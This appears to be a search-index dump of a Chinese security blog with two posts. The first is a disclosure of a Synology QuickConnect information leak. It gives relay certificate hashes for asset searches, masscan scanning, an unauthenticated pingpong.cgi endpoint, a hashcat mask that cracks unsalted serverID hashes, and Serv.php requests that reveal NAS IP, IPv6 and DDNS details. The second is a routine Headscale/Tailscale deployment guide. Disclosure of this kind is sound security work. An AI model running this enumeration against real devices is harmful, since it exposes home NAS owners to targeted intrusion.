<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>群晖 QuickConnect DDNS/IPv6 信息泄露</title>
    <link href="/SecLabBlog/2025/08/29/synology_info_leak/"/>
    <url>/SecLabBlog/2025/08/29/synology_info_leak/</url>
    
    <content type="html"><![CDATA[<h1 id="关于-QuickConnect"><a href="#关于-QuickConnect" class="headerlink" title="关于 QuickConnect"></a>关于 QuickConnect</h1><p><img src="/SecLabBlog/images/synology_info_leak/Snipaste_2025-08-29_16-39-58.png"></p><ol><li><p>QuickConnect 是群晖的云服务，用于远程访问内网 NAS 设备。</p></li><li><p>QC 会根据用户输入的 QC ID 获取设备信息，包括DDNS、IPv6，以自动选择最合适的远程访问方式。</p></li><li><p>如果没有上述的有效访问方式，QC 还会通过中继的方式为用户提供访问能力，中继服务器会通过端口转发的方式访问 NAS。</p></li></ol><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>其实这个 “漏洞” 并不能严格说是漏洞，群晖官方认为这是设计的功能，有意而为的，但个人看来该功能中存在一些对敏感信息的保护不足的情况，导致有心人可以持续枚举互联网上的 NAS 设备。</p><h2 id="枚举中继服务器"><a href="#枚举中继服务器" class="headerlink" title="枚举中继服务器"></a>枚举中继服务器</h2><p>首先我们找到中继服务器的证书，已知的指纹有这些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cert.hash=<span class="hljs-string">&quot;60f00749a29cba973df45d2122e23addfce77adc4edadc4ff57db85bfa784c60&quot;</span><br>cert.hash=<span class="hljs-string">&quot;809022efb39c964155d96bbfe547841371c6808021b5e568e1b617754d6f9a36&quot;</span><br></code></pre></td></tr></table></figure><p>在微步（或 zoomeye、shodan）可以搜索到全部使用此证书的资产：</p><p>![](&#x2F;images&#x2F;synology_info_leak&#x2F;Pasted image 20250826175324.png)</p><p>随后可以针对这些IP地址，使用工具扫描中继端口。 可以使用 <code>masscan</code> 扫描 &gt; 10000 的端口，也可以使用 shodan 或微步来获取，不过 <code>masscan</code> 更准确。</p><h2 id="获取设备-ezid"><a href="#获取设备-ezid" class="headerlink" title="获取设备 ezid"></a>获取设备 ezid</h2><p>群晖 NAS 有一个无需授权的 api：<code>https://ip:port/webman/pingpong.cgi?action=cors&amp;quickconnect=true</code></p><p>可以获得设备的 <code>ezid</code> 信息：</p><p><img src="/SecLabBlog/images/headscale_deploy/ezid.png"></p><p>这个 <code>ezid</code> 其实就是 <code>serverID</code> 的 <code>md5</code> 散列值。</p><p>我们可以通过 <code>hashcat</code> 碰撞出原始的 <code>serverID</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs regexp">hashcat -m 0 -a 3 ezid_results.txt &#x27;0?d?d?d?d?d?d?d?d&#x27;<br></code></pre></td></tr></table></figure><p>由于 <code>serverID</code> 均为 0 开头的9位纯数字，且没有加盐，所以可以在<strong>数秒内</strong>完成碰撞。</p><h2 id="获取设备详细信息"><a href="#获取设备详细信息" class="headerlink" title="获取设备详细信息"></a>获取设备详细信息</h2><p>根据上述获得的 <code>serverID</code>，通过 <code>QuickConnect</code> 的 <code>Serv.php</code> 接口可以获得设备的详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /Serv.php HTTP/2<br>Host: global.quickconnect.to<br>Content-Length: 165<br>Accept-Language: zh-CN,zh;q=0.9<br>Accept: application/json, text/javascript, */*; q=0.01<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36<br>Accept-Encoding: gzip, deflate, br<br>Priority: u=1, i<br><br>[&#123;<span class="hljs-string">&quot;version&quot;</span>:1,<span class="hljs-string">&quot;command&quot;</span>:<span class="hljs-string">&quot;get_server_info&quot;</span>,<span class="hljs-string">&quot;stop_when_error&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;stop_when_success&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;mainapp_https&quot;</span>,<span class="hljs-string">&quot;serverID&quot;</span>:<span class="hljs-string">&quot;012345678&quot;</span>,<span class="hljs-string">&quot;is_gofile&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>上述响应如果有详情则无需继续请求，否则需根据响应发送第二个请求，比如响应如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[&#123;<span class="hljs-string">&quot;command&quot;</span>:<span class="hljs-string">&quot;get_server_info&quot;</span>,<span class="hljs-string">&quot;errinfo&quot;</span>:<span class="hljs-string">&quot;get_server_info.go:112[Ds info not found]&quot;</span>,<span class="hljs-string">&quot;errno&quot;</span>:4,<span class="hljs-string">&quot;sites&quot;</span>:[<span class="hljs-string">&quot;dec.quickconnect.to&quot;</span>],<span class="hljs-string">&quot;suberrno&quot;</span>:2,<span class="hljs-string">&quot;version&quot;</span>:1&#125;]<br></code></pre></td></tr></table></figure><p>这意味着 <code>global.quickconnect.to</code> 没有找到详细信息，但在其他中继上找到了，则需要根据 <code>sites</code> 再次请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /Serv.php HTTP/2<br>Host: dec.quickconnect.to &lt;----- 修改此处域名, 逐个尝试 sites 中的域名<br>Content-Length: 165<br>Accept-Language: zh-CN,zh;q=0.9<br>Accept: application/json, text/javascript, */*; q=0.01<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36<br>Accept-Encoding: gzip, deflate, br<br>Priority: u=1, i<br><br>[&#123;<span class="hljs-string">&quot;version&quot;</span>:1,<span class="hljs-string">&quot;command&quot;</span>:<span class="hljs-string">&quot;get_server_info&quot;</span>,<span class="hljs-string">&quot;stop_when_error&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;stop_when_success&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;mainapp_https&quot;</span>,<span class="hljs-string">&quot;serverID&quot;</span>:<span class="hljs-string">&quot;012345678&quot;</span>,<span class="hljs-string">&quot;is_gofile&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>设备详细响应如下：</p><p><img src="/SecLabBlog/images/synology_info_leak/ezid.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<br>&#123;<br><span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;get_server_info&quot;</span>,<br><span class="hljs-string">&quot;env&quot;</span>: &#123;<br><span class="hljs-string">&quot;control_host&quot;</span>: <span class="hljs-string">&quot;dec.quickconnect.to&quot;</span>,<br><span class="hljs-string">&quot;relay_region&quot;</span>: <span class="hljs-string">&quot;de7&quot;</span><br>&#125;,<br><span class="hljs-string">&quot;errno&quot;</span>: 0,<br><span class="hljs-string">&quot;server&quot;</span>: &#123;<br><span class="hljs-string">&quot;ddns&quot;</span>: <span class="hljs-string">&quot;NULL&quot;</span>,<br><span class="hljs-string">&quot;ds_state&quot;</span>: <span class="hljs-string">&quot;CONNECTED&quot;</span>,<br><span class="hljs-string">&quot;external&quot;</span>: &#123;<br><span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;217.xxx.xxx.19&quot;</span>,<br><span class="hljs-string">&quot;ipv6&quot;</span>: <span class="hljs-string">&quot;::&quot;</span><br>&#125;,<br><span class="hljs-string">&quot;fqdn&quot;</span>: <span class="hljs-string">&quot;NULL&quot;</span>,<br><span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;192.xxx.xxx.1&quot;</span>,<br><span class="hljs-string">&quot;interface&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.xxx.xxx.199&quot;</span>,<br><span class="hljs-string">&quot;ipv6&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;addr_type&quot;</span>: 0,<br><span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;2001:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:fa97&quot;</span>,<br><span class="hljs-string">&quot;prefix_length&quot;</span>: 64,<br><span class="hljs-string">&quot;scope&quot;</span>: <span class="hljs-string">&quot;global&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;addr_type&quot;</span>: 32,<br><span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;fe80::xxx:xxxx:xxxx:fa97&quot;</span>,<br><span class="hljs-string">&quot;prefix_length&quot;</span>: 64,<br><span class="hljs-string">&quot;scope&quot;</span>: <span class="hljs-string">&quot;link&quot;</span><br>&#125;<br>],<br><span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.255.0&quot;</span>,<br><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;eth0&quot;</span><br>&#125;<br>],<br><span class="hljs-string">&quot;ipv6_tunnel&quot;</span>: [],<br><span class="hljs-string">&quot;is_bsm&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;pingpong_path&quot;</span>: <span class="hljs-string">&quot;/webman/pingpong.cgi?action=cors&amp;quickconnect=true&quot;</span>,<br><span class="hljs-string">&quot;redirect_prefix&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-string">&quot;serverID&quot;</span>: <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>,<br><span class="hljs-string">&quot;tcp_punch_port&quot;</span>: 0,<br><span class="hljs-string">&quot;udp_punch_port&quot;</span>: 42935<br>&#125;,<br><span class="hljs-string">&quot;service&quot;</span>: &#123;<br><span class="hljs-string">&quot;port&quot;</span>: 5001,<br><span class="hljs-string">&quot;ext_port&quot;</span>: 5001,<br><span class="hljs-string">&quot;pingpong&quot;</span>: <span class="hljs-string">&quot;DISCONNECTED&quot;</span>,<br><span class="hljs-string">&quot;pingpong_desc&quot;</span>: [],<br><span class="hljs-string">&quot;relay_ip&quot;</span>: <span class="hljs-string">&quot;195.xxx.xxx.81&quot;</span>,<br><span class="hljs-string">&quot;relay_dn&quot;</span>: <span class="hljs-string">&quot;xxx.xx.xx.quickconnect.to&quot;</span>,<br><span class="hljs-string">&quot;relay_port&quot;</span>: xxxxx,<br><span class="hljs-string">&quot;vpn_ip&quot;</span>: <span class="hljs-string">&quot;169.xxx.xxx.170&quot;</span>,<br><span class="hljs-string">&quot;https_ip&quot;</span>: <span class="hljs-string">&quot;195.xxx.xxx.81&quot;</span>,<br><span class="hljs-string">&quot;https_port&quot;</span>: 443<br>&#125;,<br><span class="hljs-string">&quot;version&quot;</span>: 1<br>&#125;<br>]<br></code></pre></td></tr></table></figure><p>关于响应字段的解析，可以参考：<a href="https://music.aqzscn.cn/docs/notes/services/audiostation/">https://music.aqzscn.cn/docs/notes/services/audiostation/</a></p><p>简单来说，响应中包含：</p><ul><li>DDNS</li><li>IPv4&#x2F;6</li><li>内网网关</li><li>中继服务器和端口</li><li>serverID</li></ul><p>我枚举了一部分：</p><p><img src="/SecLabBlog/images/synology_info_leak/ddns_enum.png"></p><h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><p>其实每一个环节看起来似乎都很合理没什么问题，但：</p><ol><li><p>如果这些设备配置了 <code>DDNS</code> 或 <code>IPv6</code>，就有可能导致被恶意访问。</p></li><li><p>通过 <code>Serv</code> 接口获取设备详细信息并不要求“近期使用过 QC”的条件，这个条件是为了获取 <code>QC</code> 中继端口以直接访问设备，用于通过 <code>pingpong</code> 接口获得 <code>ezid</code>。所以攻击者可以定时定期收集 <code>ezid</code> 数据，不断扩充收集到的数据。</p></li><li><p>没猜错的话 <code>serverID</code> 是与设备或账号绑定的，因此一般不会变。</p></li><li><p>获得 <code>ezid</code> 后很容易被碰撞出原 <code>serverID</code>，这一点是主要<strong>使我感到不安</strong>的地方，因为 <code>Serv</code> 接口只接受 <code>ServerID</code> 或 <code>QC ID</code>，并不接受哈希，因此如果此处使用较复杂的哈希运算，使得攻击者完全无法轻易进行碰撞，那么安全性会大幅提高。</p></li><li><p>个人认为，<code>IPv6</code> 比 <code>IPv4</code> 更难猜测，而 <code>DDNS</code> 也是用户手动配置的，因此均具有一定隐秘性和随机性，但此“漏洞”会导致这些信息完全暴露。当然这一点可能比较有争议。</p></li><li><p>由于 NAS 主要在内网使用，且相当一部分用户并非专业互联网从业人员，安全保护相对会可能差一些，比如会装一些第三方套件、部署一些不安全的 web 站点或 docker 容器，或配置了匿名访问的 FTP、SMB、WebDav等服务（比如我），因此如果 NAS 能够被互联网用户直接访问，会有较大风险。</p></li></ol><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>此“漏洞”已提交给群晖官方，官方表示“非漏洞”，个人认为可以理解，但确实可以做得更好更安全。</p><p>无论群晖官方是否会做出更多加固，请务必保持安全意识，可以使用 VPN 来远程访问。严格控制暴露的端口，减小攻击面。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Synology</tag>
      
      <tag>信息泄露</tag>
      
      <tag>群晖</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Headscale 0.23.0 部署</title>
    <link href="/SecLabBlog/2024/10/14/headscale_deploy/"/>
    <url>/SecLabBlog/2024/10/14/headscale_deploy/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>Headscale 升级了最新版(0.23)，相对于之前的版本做了许多改动，因此写下此文，重新部署一遍最新版本的 Headscale + Tailscale。</p><ul><li><strong>系统环境</strong>: 阿里云 Debian 12 （纯 IP）</li><li><strong>Headscale 版本</strong>: Headscale 0.23.0</li><li><strong>Tailscale 版本</strong>: Tailscale 1.76.0</li></ul><h1 id="在线链接"><a href="#在线链接" class="headerlink" title="在线链接"></a>在线链接</h1><ul><li><strong>Tailscale 官网</strong>: <a href="https://tailscale.com/">https://tailscale.com/</a></li><li><strong>Tailscale 仓库</strong>: <a href="https://github.com/tailscale/tailscale">https://github.com/tailscale/tailscale</a></li><li><strong>Headscale 官网</strong>: <a href="https://headscale.net/">https://headscale.net/</a></li><li><strong>Headscale 仓库</strong>: <a href="https://github.com/juanfont/headscale">https://github.com/juanfont/headscale</a></li></ul><h2 id="准备安装程序"><a href="#准备安装程序" class="headerlink" title="准备安装程序"></a>准备安装程序</h2><p>按需下载以下程序: </p><ul><li><strong>Headscale</strong>: <a href="https://github.com/juanfont/headscale/releases/download/v0.23.0/headscale_0.23.0_linux_amd64.deb">headscale_0.23.0_linux_amd64.deb</a></li><li><strong>Tailscale Windows</strong>: <a href="https://pkgs.tailscale.com/stable/tailscale-setup-1.76.0-amd64.msi">tailscale-setup-1.76.0-amd64.msi</a></li><li><strong>Tailscale MacOS</strong>: <a href="https://pkgs.tailscale.com/stable/Tailscale-1.76.0-macos.pkg">Tailscale-1.76.0-macos.pkg</a></li><li><strong>Tailscale 群晖</strong>: <a href="https://pkgs.tailscale.com/stable/#spks">https://pkgs.tailscale.com/stable/#spks</a></li></ul><h1 id="安装-Headscale-服务端"><a href="#安装-Headscale-服务端" class="headerlink" title="安装 Headscale 服务端"></a>安装 Headscale 服务端</h1><h2 id="安装服务端"><a href="#安装服务端" class="headerlink" title="安装服务端"></a>安装服务端</h2><p>将 <code>headscale_0.23.0_linux_amd64.deb</code> 上传云服务器，执行安装命令: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg --install ./headscale_0.23.0_linux_amd64.deb<br></code></pre></td></tr></table></figure><p>通过 <code>deb</code> 文件安装的服务端会自动创建需要的目录和配置文件，我们只需要对配置文件做一些修改。</p><p>默认配置文件路径: <code>/etc/headscale/config.yaml</code>。要修改的内容如下: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_url: http://127.0.0.1:8080 <span class="hljs-comment"># 将 127.0.0.1 修改为服务器地址</span><br>listen_addr: 127.0.0.1:8080 <span class="hljs-comment"># 修改为 0.0.0.0:8080</span><br>magic_dns: <span class="hljs-literal">true</span> <span class="hljs-comment"># 修改为 magic_dns: false</span><br></code></pre></td></tr></table></figure><p>当然如果要使用 <code>Nginx</code> 反代等服务，则视情况自行修改该配置文件。</p><p>配置 Headscale 服务自启动: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> headscale<br>systemctl start headscale<br></code></pre></td></tr></table></figure><p>查看服务状态: </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status headscale</span><br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image.png"></p><p>能够访问服务器的 <code>/windows</code> 端点，则说明正常启动。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-1.png"></p><h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>在 Headscale 服务器上执行以下命令来创建命名空间（也称租户、用户）: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">headscale namespace create master <span class="hljs-comment"># 创建名为 master 的 namespace</span><br></code></pre></td></tr></table></figure><h1 id="安装-Tailscale-客户端"><a href="#安装-Tailscale-客户端" class="headerlink" title="安装 Tailscale 客户端"></a>安装 Tailscale 客户端</h1><h2 id="Windows-客户端"><a href="#Windows-客户端" class="headerlink" title="Windows 客户端"></a>Windows 客户端</h2><h3 id="清理环境"><a href="#清理环境" class="headerlink" title="清理环境"></a>清理环境</h3><p>如果之前安装过旧版本的 tailscale，建议清理一下。</p><p>首先从控制面板卸载已有的 tailscale，然后清理这里的注册表: </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_LOCAL_MACHINE<span class="hljs-string">\SOFTWARE\Tailscale</span> IPN<br></code></pre></td></tr></table></figure><p>以及这里的文件: </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\ProgramData\Tailscale<br><span class="hljs-name">C</span>:\Users\%USERNAME%\AppData\Local\Tailscale<br><span class="hljs-name">C</span>:\Windows\System32\config\systemprofile\AppData\Local\Tailscale<br></code></pre></td></tr></table></figure><p>如果提示文件被占用，则检查是否后台还在运行 <code>tailscale</code>、<code>tailscaled</code> 或 <code>tailscale-ipn</code> 进程，以及是否在运行 <code>tailscale</code> 服务。</p><h3 id="安装并登录客户端"><a href="#安装并登录客户端" class="headerlink" title="安装并登录客户端"></a>安装并登录客户端</h3><p>配置方法可以参考: <code>http://xxx.xxx.xxx.xxx:8080/windows</code>, 将 url 中的地址改为自己 Headscale 服务器的地址。</p><p>安装前文提供的 <code>msi</code> 安装程序，然后执行以下命令以接入 Headscale: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tailscale login --login-server=http://xxx.xxx.xxx.xxx:8080/ --accept-routes=<span class="hljs-literal">false</span> --accept-dns=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>如果一切正常，应该如下显示: </p><p><img src="/SecLabBlog/images/headscale_deploy/image-2.png"></p><p>对于 Windows 来说，可能会自动弹出浏览器访问该 url，如果没有弹出则手动访问。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-3.png"></p><p>在 Headscale 服务器上执行这段命令，即可注册 tailscale 客户端: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">headscale nodes register --user master --key mkey:a658b2c3c0f26eb1100250da12c2661f9d300605eced18e29bdd23cf9836127b<br></code></pre></td></tr></table></figure><p><strong>注1:</strong> 我们之前创建的命名空间为 <code>master</code>，因此此处 <code>--user</code> 参数设为 <code>master</code>。</p><p><strong>注2:</strong> 如果执行 <code>tailscale login ...</code> 命令后一直没有显示 <code>To authenticate ...</code> 这一段 url，则考虑执行以下 <code>powershell</code> 命令来清理缓存: </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 停止 tailscale-ipn.exe 进程</span><br><span class="hljs-built_in">Stop-Process</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscale-ipn&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br><span class="hljs-comment"># 停止 tailscale 服务</span><br><span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscale&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># 等待 tailscale 服务完全停止</span><br><span class="hljs-variable">$service</span> = <span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscale&quot;</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$service</span>.Status <span class="hljs-operator">-ne</span> <span class="hljs-string">&#x27;Stopped&#x27;</span>) &#123;<br>    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Seconds</span> <span class="hljs-number">3</span><br>    <span class="hljs-variable">$service</span>.Refresh()<br>&#125;<br><span class="hljs-comment"># 停止 tailscaled 进程</span><br><span class="hljs-built_in">Stop-Process</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscaled&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br><span class="hljs-comment"># 删除文件夹</span><br><span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;C:\ProgramData\Tailscale&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:LOCALAPPDATA</span>\Tailscale&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># 启动 tailscale 服务</span><br><span class="hljs-built_in">Start-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscale&quot;</span><br></code></pre></td></tr></table></figure><p>清理后，重新双击 tailscale 图标以运行客户端，然后重新执行前文所述的 <code>tailscale login ....</code> 命令。</p><p><strong>注3:</strong> 据称在 <code>Windows 11 24H2</code> 等版本上，重启 tailscale 后可能会出现无法重连、卡在 <code>Starting</code> 状态等问题。 </p><p>参考:  <a href="https://github.com/tailscale/tailscale/issues/13660">https://github.com/tailscale/tailscale/issues/13660</a></p><p>可以通过管理员权限执行以下 <code>Powershell</code> 命令解决: </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Restart-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;tailscale&quot;</span><br>tailscale up<br></code></pre></td></tr></table></figure><p>执行后，重新打开 tailscale 客户端即可。</p><p>也可以创建一个快捷方式，将其 “目标” 字段修改为: </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-NoProfile</span> <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Restart-Service -Name &quot;</span>Tailscale<span class="hljs-string">&quot; -Force;Start-Process \&quot;</span>C:\Program Files\Tailscale\tailscale<span class="hljs-literal">-ipn</span>.exe\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image-16.png"></p><p>同时设置快捷方式以<strong>管理员身份</strong>运行。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-17.png"></p><p>最后修改一下快捷方式的图标，就可以正常用了。</p><h2 id="Linux-客户端"><a href="#Linux-客户端" class="headerlink" title="Linux 客户端"></a>Linux 客户端</h2><p>以 Ubuntu 为例: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 tailscale 仓库</span><br><span class="hljs-built_in">mkdir</span> -p --mode=0755 /usr/share/keyrings<br>curl -fsSL https://pkgs.tailscale.com/stable/debian/bookworm.noarmor.gpg | <span class="hljs-built_in">tee</span> /usr/share/keyrings/tailscale-archive-keyring.gpg &gt;/dev/null<br>curl -fsSL https://pkgs.tailscale.com/stable/debian/bookworm.tailscale-keyring.list | <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/tailscale.list<br><span class="hljs-comment"># 安装 tailscale</span><br>apt-get update &amp;&amp; apt-get install tailscale<br></code></pre></td></tr></table></figure><p>接入 Headscale: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tailscale login --login-server=http://xxx.xxx.xxx.xxx:8080/ --accept-routes=<span class="hljs-literal">false</span> --accept-dns=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image-9.png"></p><p>同前文，访问该 url 并在 Headscale 服务器上执行所示命令即可。</p><h2 id="MacOS-客户端"><a href="#MacOS-客户端" class="headerlink" title="MacOS 客户端"></a>MacOS 客户端</h2><p>配置方法可以参考: <code>http://xxx.xxx.xxx.xxx:8080/apple</code>, 将 url 中的地址改为自己 Headscale 服务器的地址。</p><p>安装前文提供的 <code>pkg</code> 安装包，依照程序界面提示，允许配置系统 <code>VPN</code> 权限。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-11.png"></p><p>接入 Headscale: </p><p>按住 <code>option (⌥)</code> 键并点击菜单栏中的 <code>tailscale</code> 图标，点击 <code>Debug - Add Account</code> 按钮:  </p><p><img src="/SecLabBlog/images/headscale_deploy/image-12.png"></p><p>填写自己的 Headscale 服务器 url: </p><p><img 